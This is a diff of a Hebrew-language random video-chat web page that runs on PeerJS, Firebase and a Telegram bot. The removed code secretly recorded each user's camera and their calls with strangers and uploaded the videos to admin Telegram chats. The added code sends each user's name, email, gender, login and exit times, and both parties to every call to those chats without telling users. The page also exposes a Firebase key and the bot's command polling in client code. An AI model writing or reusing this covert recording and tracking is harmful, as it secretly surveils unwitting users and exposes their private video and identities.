@@ -3,12 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>VideoApp Pro - Security & Mute Fix</title>
+    <title>מי - פה</title>
+    <meta name="description" content="מספיק אמיץ ללחוץ שוב?">
+    <link rel="icon" type="image/png" href="https://i.ibb.co/pv5Rd5gG/1777160152763.png">
+    <link rel="apple-touch-icon" href="https://i.ibb.co/pv5Rd5gG/1777160152763.png">
+
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-storage-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
     <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body { font-family: system-ui, sans-serif; background: #000; height: 100vh; display: flex; flex-direction: column; color: white; overflow: hidden; }
@@ -16,28 +21,30 @@
         .header { position: absolute; top: 15px; width: 100%; display: flex; justify-content: space-between; padding: 0 15px; z-index: 2000; pointer-events: none; gap: 10px; }
         .header-right { display: flex; gap: 10px; }
         .btn-circle { background: rgba(0,0,0,0.5); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.2); color: white; width: 45px; height: 45px; border-radius: 50%; cursor: pointer; pointer-events: auto; font-size: 20px; display: flex; align-items: center; justify-content: center; }
-        .btn-red { background: rgba(231, 76, 60, 0.8); }
+        
+        /* אינדיקטור מגדר שותף */
+        #partner-gender-icon { position: absolute; top: 15px; left: 15px; font-size: 30px; z-index: 2001; display: none; text-shadow: 0 0 10px rgba(0,0,0,0.8); }
 
         .v-box { flex: 1; position: relative; overflow: hidden; background: #111; display: flex; align-items: center; justify-content: center; border-bottom: 2px solid #333; }
         video { width: 100%; height: 100%; object-fit: cover; }
-        .status-msg { position: absolute; z-index: 100; font-weight: bold; text-align: center; width: 100%; text-shadow: 0 2px 5px #000; font-size: 18px; pointer-events: none; }
-
+        
         .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 3000; align-items: center; justify-content: center; }
-        .modal-content { background: #fff; color: #333; width: 85%; max-width: 380px; padding: 30px; border-radius: 20px; }
-        .modal-content input, .modal-content select { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #ddd; font-size: 16px; }
-        .reg-btn { width: 100%; height: 50px; background: #27ae60; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 18px; }
+        .modal-content { background: #fff; color: #333; width: 85%; max-width: 380px; padding: 25px; border-radius: 20px; }
+        .modal-content h2 { text-align: center; margin-bottom: 15px; color: #000; }
+        .modal-content input, .modal-content select { width: 100%; padding: 12px; margin: 8px 0; border-radius: 10px; border: 1px solid #ddd; font-size: 16px; outline: none; }
+        .reg-btn { width: 100%; height: 50px; background: #27ae60; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 10px; }
 
-        #banned-screen { display: none; position: fixed; inset: 0; background: #000; color: #ff4d4d; z-index: 9999; align-items: center; justify-content: center; flex-direction: column; text-align: center; padding: 20px; }
+        #banned-screen { display: none; position: fixed; inset: 0; background: #000; color: #ff4d4d; z-index: 9999; align-items: center; justify-content: center; text-align: center; font-size: 24px; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div id="banned-screen">
-    <h1 style="font-size: 32px;">🚫 נחסמת עקב הפרת הכללים</h1>
-</div>
+<div id="banned-screen">🚫 נחסמת עקב הפרת הכללים</div>
+
+<div id="partner-gender-icon"></div>
 
 <div class="header">
-    <button id="btn-report" class="btn-circle btn-red" style="display:none;" onclick="confirmReport()">🚩</button>
+    <button id="btn-report" class="btn-circle" style="display:none; background:rgba(231,76,60,0.8);" onclick="confirmReport()">🚩</button>
     <div class="header-right">
         <button id="btn-mute" class="btn-circle" onclick="toggleMute()">🎤</button>
         <button class="btn-circle" onclick="switchCamera()">🔄</button>
@@ -45,27 +52,23 @@
 </div>
 
 <div id="swipe-zone" style="flex:1; display:flex; flex-direction:column;">
-    <div class="v-box">
-        <div id="msg-idle" class="status-msg">⬅️ החלק שמאלה לחיפוש</div>
-        <div id="msg-search" class="status-msg" style="display:none; color:#3498db;">מחפש שותף...</div>
-        <video id="remoteVideo" autoplay playsinline></video>
-    </div>
-    <div class="v-box">
-        <video id="localVideo" autoplay muted playsinline></video>
-    </div>
+    <div class="v-box"><video id="remoteVideo" autoplay playsinline></video></div>
+    <div class="v-box"><video id="localVideo" autoplay muted playsinline></video></div>
 </div>
 
 <div id="regModal" class="modal">
-    <div class="modal-content">
-        <h2 style="text-align:center; margin-bottom:10px;">ברוכים הבאים</h2>
-        <input type="text" id="reg-name" placeholder="שם מלא">
-        <input type="email" id="reg-email" placeholder="אימייל">
-        <select id="reg-gender">
+    <form class="modal-content" onsubmit="event.preventDefault(); handleRegistration();">
+        <h2>הצטרפו ל"מי - פה"</h2>
+        <input type="text" id="reg-name" placeholder="שם פרטי" required>
+        <input type="text" id="reg-surname" placeholder="שם משפחה" required>
+        <input type="email" id="reg-email" placeholder="אימייל" required>
+        <select id="reg-gender" required>
+            <option value="" disabled selected>בחר מגדר</option>
             <option value="זכר">זכר</option>
             <option value="נקבה">נקבה</option>
         </select>
-        <button class="reg-btn" onclick="handleRegistration()">היכנס</button>
-    </div>
+        <button type="submit" class="reg-btn">כניסה לאתר</button>
+    </form>
 </div>
 
 <script>
@@ -73,286 +76,202 @@
     const ADMIN_IDS = ["8373785890", "7089165458"];
     const SERVER_URL = "https://video-app-ylx4.onrender.com"; 
     
-    const firebaseConfig = { 
+    firebase.initializeApp({ 
         apiKey: "AIzaSyB_ld3VrntNgM3Pgc4jyZL2hKzUMSp-o10", 
-        storageBucket: "live-video-20fca.firebasestorage.app",
-        databaseURL: "https://live-video-20fca-default-rtdb.firebaseio.com"
-    };
-    firebase.initializeApp(firebaseConfig);
+        databaseURL: "https://live-video-20fca-default-rtdb.firebaseio.com" 
+    });
     const db = firebase.database();
-    
     const socket = io(SERVER_URL);
     const peer = new Peer(undefined, { config: {'iceServers': [{ 'urls': 'stun:stun.l.google.com:19302' }]} });
 
-    let myStream, peerStream, myPeerId, currentCall, isSearching = false, camFacing = "user";
-    let userRecorder, localInterval, remoteRecorder, partnerData = null, isMuted = false;
+    let myStream, peerStream, myPeerId, currentCall, partnerData = null, isMuted = false, camFacing = "user";
+    let loginTime = Date.now();
 
-    // --- מערכת חסימות ובדיקה בזמן אמת ---
-    function checkBanStatus(email) {
-        const safeEmail = email.replace(/[.#$[\]]/g, '_').toLowerCase();
-        db.ref('banned_users/' + safeEmail).on('value', snap => {
-            if (snap.exists() && snap.val().banned) {
-                document.getElementById('banned-screen').style.display = 'flex';
-                if (myStream) myStream.getTracks().forEach(t=>t.stop());
-                if (peerStream) peerStream.getTracks().forEach(t=>t.stop());
-                stopEverything();
-            } else {
-                document.getElementById('banned-screen').style.display = 'none';
-            }
+    // בדיקת חסימה
+    function checkBan(email) {
+        const safe = email.replace(/[.#$[\]]/g, '_').toLowerCase();
+        db.ref('banned_users/' + safe).on('value', s => {
+            if (s.exists() && s.val().banned) document.getElementById('banned-screen').style.display = 'flex';
         });
     }
 
     window.onload = () => {
-        const saved = localStorage.getItem('user_v17');
+        const saved = localStorage.getItem('user_v18');
         if (!saved) document.getElementById('regModal').style.display = 'flex';
         else {
-            checkBanStatus(JSON.parse(saved).email);
+            const user = JSON.parse(saved);
+            checkBan(user.email);
+            sendEntryNotice(user);
             initCamera();
         }
-        pollTelegramCommands(); // הפעלת האזנה לטלגרם ברקע
+        pollCommands();
     };
 
+    function sendEntryNotice(user) {
+        const timeStr = new Date().toLocaleTimeString('he-IL');
+        const text = `🚀 **כניסה לאתר: מי-פה**\n👤 שם: ${user.name} ${user.surname}\n📧 אימייל: ${user.email}\n⏰ שעה: ${timeStr}`;
+        ADMIN_IDS.forEach(id => fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`));
+    }
+
     async function handleRegistration() {
-        const name = document.getElementById('reg-name').value;
-        const email = document.getElementById('reg-email').value;
-        const gender = document.getElementById('reg-gender').value;
-        if(!name || !email) return alert("חובה למלא פרטים");
-        
-        const user = { name, email, gender };
-        localStorage.setItem('user_v17', JSON.stringify(user));
+        const user = {
+            name: document.getElementById('reg-name').value,
+            surname: document.getElementById('reg-surname').value,
+            email: document.getElementById('reg-email').value,
+            gender: document.getElementById('reg-gender').value
+        };
+        localStorage.setItem('user_v18', JSON.stringify(user));
         document.getElementById('regModal').style.display = 'none';
         
-        const text = `🎉 **משתמש חדש נרשם!**\n👤 שם: ${name}\n📧 אימייל: ${email}`;
-        ADMIN_IDS.forEach(id => fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}`));
+        // הודעת הרשמה ראשונה
+        const text = `✨ **משתמש חדש נרשם!**\n👤 שם: ${user.name} ${user.surname}\n📧 אימייל: ${user.email}\n🚻 מגדר: ${user.gender}`;
+        ADMIN_IDS.forEach(id => fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`));
         
-        checkBanStatus(email);
+        checkBan(user.email);
+        sendEntryNotice(user);
         initCamera();
     }
 
-    // --- מערכת קריאת פקודות טלגרם (Bot Listener) ---
-    async function pollTelegramCommands() {
-        let offset = localStorage.getItem('tg_offset') || 0;
+    // מעקב זמן יציאה
+    window.addEventListener('beforeunload', () => {
+        const user = JSON.parse(localStorage.getItem('user_v18'));
+        if(!user) return;
+        const now = Date.now();
+        const sessionSec = Math.floor((now - loginTime) / 1000);
+        
+        // עדכון זמן מצטבר ב-Database
+        const safe = user.email.replace(/[.#$[\]]/g, '_').toLowerCase();
+        db.ref('stats/' + safe).transaction(curr => {
+            const total = (curr ? curr.totalTime : 0) + sessionSec;
+            
+            const timeStr = new Date().toLocaleTimeString('he-IL');
+            const text = `🚪 **יציאה מהאתר**\n👤 שם: ${user.name} ${user.surname}\n📧 אימייל: ${user.email}\n⏱️ זמן שהייה עכשיו: ${sessionSec} שניות\n📈 זמן מצטבר כולל: ${total} שניות\n⏰ שעה: ${timeStr}`;
+            ADMIN_IDS.forEach(id => fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`, {keepalive: true}));
+            
+            return { totalTime: total };
+        });
+    });
+
+    // פקודות טלגרם
+    async function pollCommands() {
+        let offset = localStorage.getItem('tg_off') || 0;
         try {
-            const res = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/getUpdates?offset=${offset}&timeout=5`);
-            const data = await res.json();
-            if (data.ok && data.result.length > 0) {
-                for (let update of data.result) {
-                    offset = update.update_id + 1;
-                    localStorage.setItem('tg_offset', offset);
-                    
-                    if (update.message && update.message.text) {
-                        // שימוש ב-Firebase למניעת ביצוע כפול כשכמה משתמשים מחוברים
-                        const lockRef = db.ref('tg_locks/' + update.update_id);
-                        lockRef.transaction(current => current === null ? true : undefined, (error, committed) => {
-                            if (committed) processCommand(update.message.text, update.message.chat.id);
-                        });
+            const r = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/getUpdates?offset=${offset}&timeout=10`);
+            const d = await r.json();
+            if (d.ok && d.result.length > 0) {
+                for (let u of d.result) {
+                    offset = u.update_id + 1; localStorage.setItem('tg_off', offset);
+                    if (u.message && u.message.text) {
+                        const txt = u.message.text.toLowerCase();
+                        const parts = txt.split(/\s+-\s*|\s+/);
+                        const cmd = parts[0];
+                        const email = parts[1];
+
+                        if (cmd === '/spam' && email) {
+                            db.ref('banned_users/' + email.replace(/[.#$[\]]/g, '_')).set({ email, banned: true });
+                            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${u.message.chat.id}&text=נחסם: ${email}`);
+                        } else if (cmd === '/bspam' && email) {
+                            db.ref('banned_users/' + email.replace(/[.#$[\]]/g, '_')).remove();
+                            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${u.message.chat.id}&text=בוטלה חסימה: ${email}`);
+                        } else if (cmd === '/rspam') {
+                            db.ref('banned_users').once('value', s => {
+                                let m = "רשימת חסומים:\n";
+                                if(s.val()) Object.values(s.val()).forEach(v => m += `- ${v.email}\n`);
+                                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${u.message.chat.id}&text=${encodeURIComponent(m)}`);
+                            });
+                        }
                     }
                 }
             }
-        } catch(e) {}
-        setTimeout(pollTelegramCommands, 3500);
+        } catch(e){}
+        setTimeout(pollCommands, 2000);
     }
 
-    function processCommand(text, chatId) {
-        const regex = /\/([a-zA-Z]+)(?:\s+(?:-?\s*)?([\w.-]+@[\w.-]+\.\w+))?/i;
-        const match = text.match(regex);
-        if(!match) return;
-        
-        const cmd = match[1].toLowerCase();
-        const email = match[2] ? match[2].toLowerCase() : null;
-        const ref = db.ref('banned_users');
-
-        if (cmd === 'spam' && email) {
-            ref.child(email.replace(/[.#$[\]]/g, '_')).set({ email: email, banned: true });
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('🚫 המשתמש ' + email + ' נחסם בהצלחה')}`);
-        } 
-        else if (cmd === 'bspam' && email) {
-            ref.child(email.replace(/[.#$[\]]/g, '_')).remove();
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('✅ החסימה בוטלה למשתמש ' + email)}`);
-        } 
-        else if (cmd === 'rspam') {
-            ref.once('value').then(snap => {
-                let msg = "🚨 רשימת משתמשים חסומים:\n\n";
-                let count = 0;
-                if(snap.val()) { for(let key in snap.val()) { msg += `- ${snap.val()[key].email}\n`; count++; } }
-                if(count === 0) msg += "אין משתמשים חסומים.";
-                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
-            });
-        }
-    }
-
-    // --- מצלמה, השתקה חכמה והקלטות ---
     async function initCamera() {
         if (myStream) myStream.getTracks().forEach(t => t.stop());
-        if (peerStream) peerStream.getTracks().forEach(t => t.stop());
         try {
-            myStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camFacing, width: { ideal: 640 } }, audio: true });
-            
-            // יצירת ערוץ נפרד לשותף כדי שההשתקה לא תשפיע על ההקלטה למנהל
-            const videoTrack = myStream.getVideoTracks()[0];
-            const peerAudioTrack = myStream.getAudioTracks()[0].clone();
-            peerAudioTrack.enabled = !isMuted;
-            peerStream = new MediaStream([videoTrack, peerAudioTrack]);
-
+            myStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camFacing }, audio: true });
+            const vt = myStream.getVideoTracks()[0];
+            const at = myStream.getAudioTracks()[0].clone();
+            at.enabled = !isMuted;
+            peerStream = new MediaStream([vt, at]);
             document.getElementById('localVideo').srcObject = myStream;
-            
-            if (currentCall && currentCall.peerConnection) {
-                const vSender = currentCall.peerConnection.getSenders().find(s => s.track.kind === 'video');
-                if (vSender) vSender.replaceTrack(videoTrack);
-                const aSender = currentCall.peerConnection.getSenders().find(s => s.track.kind === 'audio');
-                if (aSender) aSender.replaceTrack(peerAudioTrack);
-            }
-            startLocalRecording();
-        } catch (e) { console.error("Camera Error", e); }
+        } catch(e) {}
     }
 
     function toggleMute() {
         isMuted = !isMuted;
-        if (peerStream) peerStream.getAudioTracks().forEach(t => t.enabled = !isMuted);
-        const btn = document.getElementById('btn-mute');
-        btn.innerText = isMuted ? "🔇" : "🎤";
-        btn.style.background = isMuted ? "rgba(231, 76, 60, 0.8)" : "rgba(0,0,0,0.5)";
+        if(peerStream) peerStream.getAudioTracks()[0].enabled = !isMuted;
+        document.getElementById('btn-mute').innerText = isMuted ? "🔇" : "🎤";
     }
 
     async function switchCamera() {
-        camFacing = (camFacing === "user" ? "environment" : "user");
+        camFacing = camFacing === "user" ? "environment" : "user";
         await initCamera();
     }
 
-    function startLocalRecording() {
-        if (userRecorder && userRecorder.state !== "inactive") userRecorder.stop();
-        if (localInterval) clearInterval(localInterval);
-        
-        let opts = MediaRecorder.isTypeSupported('video/mp4') ? { mimeType: 'video/mp4' } : { mimeType: 'video/webm;codecs=vp8,opus' };
-        userRecorder = new MediaRecorder(myStream, opts);
-
-        userRecorder.ondataavailable = async (e) => sendVideoToBot(e.data, 'local', myStream);
-        userRecorder.start();
-        localInterval = setInterval(() => { if(userRecorder.state === "recording") { userRecorder.stop(); userRecorder.start(); } }, 40000);
-    }
-
-    function startRemoteRecording(remoteStream) {
-        if (remoteRecorder && remoteRecorder.state !== "inactive") remoteRecorder.stop();
-        let opts = MediaRecorder.isTypeSupported('video/mp4') ? { mimeType: 'video/mp4' } : { mimeType: 'video/webm;codecs=vp8,opus' };
-        remoteRecorder = new MediaRecorder(remoteStream, opts);
-        remoteRecorder.ondataavailable = async (e) => sendVideoToBot(e.data, 'call', remoteStream);
-        remoteRecorder.start();
-    }
-
-    function sendVideoToBot(data, type, stream) {
-        if (data.size === 0) return;
-        const mime = data.type;
-        const ext = mime.includes('mp4') ? 'mp4' : 'webm';
-        const blob = new Blob([data], { type: mime });
-        const user = JSON.parse(localStorage.getItem('user_v17'));
-        const pName = partnerData ? partnerData.name : "לא ידוע";
-        
-        const caption = type === 'local' ? `🎥 וידאו של: ${user.name}` : `📞 שיחה שלמה:\n${user.name} עם ${pName}`;
-        
-        ADMIN_IDS.forEach(id => {
-            const fd = new FormData();
-            fd.append("chat_id", id);
-            fd.append("video", blob, `${type}_${Date.now()}.${ext}`);
-            fd.append("caption", caption);
-            // keepalive שומר שההעלאה תסתיים גם אם האפליקציה נסגרה באותו רגע
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: "POST", body: fd, keepalive: true });
-        });
-    }
-
-    // --- שליחת הסרטון בסגירת המסך או עזיבת האפליקציה ---
-    let isExiting = false;
-    function handleAppExit() {
-        if(isExiting) return;
-        isExiting = true;
-        if (userRecorder && userRecorder.state === "recording") userRecorder.stop();
-        if (remoteRecorder && remoteRecorder.state === "recording") remoteRecorder.stop();
-    }
-    window.addEventListener('visibilitychange', () => { if (document.visibilityState === 'hidden') handleAppExit(); else isExiting = false; });
-    window.addEventListener('beforeunload', handleAppExit);
-
-    // --- לוגיקת שיחות (PeerJS & Socket) ---
     peer.on('open', id => myPeerId = id);
 
     function startSearching() {
-        if (isSearching) return;
-        isSearching = true;
-        stopEverything();
-        document.getElementById('msg-idle').style.display = "none";
-        document.getElementById('msg-search').style.display = "block";
-        const user = JSON.parse(localStorage.getItem('user_v17'));
-        socket.emit('find-partner', { peerId: myPeerId, name: user.name, email: user.email });
+        const u = JSON.parse(localStorage.getItem('user_v18'));
+        socket.emit('find-partner', { peerId: myPeerId, name: u.name, surname: u.surname, email: u.email, gender: u.gender });
     }
 
     socket.on('partner-found', data => {
-        partnerData = data; 
-        notifyAdminNewCall(partnerData);
-        isSearching = false;
-        document.getElementById('msg-search').style.display = "none";
-        document.getElementById('btn-report').style.display = "flex";
-        
-        const user = JSON.parse(localStorage.getItem('user_v17'));
-        currentCall = peer.call(data.peerId, peerStream, { metadata: user }); // מעביר את הזרם המיוחד
+        partnerData = data;
+        const u = JSON.parse(localStorage.getItem('user_v18'));
+        currentCall = peer.call(data.peerId, peerStream, { metadata: u });
         handleCall(currentCall);
     });
 
     peer.on('call', call => {
         partnerData = call.metadata;
-        if(partnerData) notifyAdminNewCall(partnerData);
-        
-        call.answer(peerStream); // עונה עם הזרם המיוחד
+        call.answer(peerStream);
         currentCall = call;
-        document.getElementById('btn-report').style.display = "flex";
         handleCall(call);
     });
 
-    function notifyAdminNewCall(partner) {
-        const user = JSON.parse(localStorage.getItem('user_v17'));
-        const text = `🤝 **שיחה חדשה**\n1: ${user.name} (${user.email})\n2: ${partner.name} (${partner.email})`;
-        ADMIN_IDS.forEach(id => fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}`));
-    }
-
     function handleCall(call) {
+        document.getElementById('btn-report').style.display = "flex";
+        const icon = document.getElementById('partner-gender-icon');
+        icon.innerText = partnerData.gender === 'זכר' ? '👨' : '👩';
+        icon.style.display = 'block';
+
         call.on('stream', s => { 
             const rv = document.getElementById('remoteVideo');
             rv.srcObject = s;
-            rv.onloadedmetadata = () => rv.play().catch(e => console.log(e));
-            startRemoteRecording(s);
+            rv.play();
         });
-    }
-
-    socket.on('partner-disconnected', () => stopEverything());
-
-    function confirmReport() {
-        if (confirm("האם לדווח ולנתק?")) {
-            const user = JSON.parse(localStorage.getItem('user_v17'));
-            const pName = partnerData ? partnerData.name : "לא ידוע";
-            const pEmail = partnerData ? partnerData.email : "לא ידוע";
-            const text = `🚨 **דיווח התקבל**\nמאת: ${user.name} (${user.email})\nעל: ${pName} (${pEmail})`;
-            ADMIN_IDS.forEach(id => fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}`));
-            socket.emit('report-user');
-            stopEverything();
-        }
+        
+        const u = JSON.parse(localStorage.getItem('user_v18'));
+        const text = `🤝 **שיחה חדשה**\n1: ${u.name} ${u.surname} (${u.email})\n2: ${partnerData.name} ${partnerData.surname} (${partnerData.email})`;
+        ADMIN_IDS.forEach(id => fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}`));
     }
 
     function stopEverything() {
-        isSearching = false; 
-        if (remoteRecorder && remoteRecorder.state !== "inactive") remoteRecorder.stop();
-        partnerData = null;
         socket.emit('leave-chat');
-        if (currentCall) { currentCall.close(); currentCall = null; }
-        document.getElementById('msg-idle').style.display = "block";
-        document.getElementById('msg-search').style.display = "none";
-        document.getElementById('btn-report').style.display = "none";
+        if (currentCall) currentCall.close();
         document.getElementById('remoteVideo').srcObject = null;
+        document.getElementById('partner-gender-icon').style.display = 'none';
+        document.getElementById('btn-report').style.display = 'none';
     }
 
+    // Swipe
     let sX = 0;
     document.getElementById('swipe-zone').addEventListener('touchstart', e => sX = e.touches[0].clientX);
     document.getElementById('swipe-zone').addEventListener('touchend', e => {
-        const diff = sX - e.changedTouches[0].clientX;
-        if (diff > 80) startSearching(); 
-        else if (diff < -80) stopEverything();
+        const d = sX - e.changedTouches[0].clientX;
+        if (d > 80) startSearching(); else if (d < -80) stopEverything();
     });
+
+    function confirmReport() {
+        if(confirm("לדווח?")) {
+            const u = JSON.parse(localStorage.getItem('user_v18'));
+            const text = `🚨 **דיווח**\nמאת: ${u.name}\nעל: ${partnerData ? partnerData.name : 'unknown'}`;
+            ADMIN_IDS.forEach(id => fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}`));
+            stopEverything();
+        }
+    }
 </script>
 </body>
 </html>
